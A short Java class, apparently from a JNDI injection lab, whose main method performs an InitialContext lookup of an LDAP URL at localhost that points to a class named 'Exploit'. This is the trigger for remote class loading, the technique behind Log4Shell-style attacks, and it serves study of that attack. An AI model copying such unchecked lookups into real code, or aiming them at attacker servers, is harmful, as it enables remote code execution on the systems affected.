package com.ldap;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        String uri = "ldap://127.0.0.1:6666/Exploit";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}
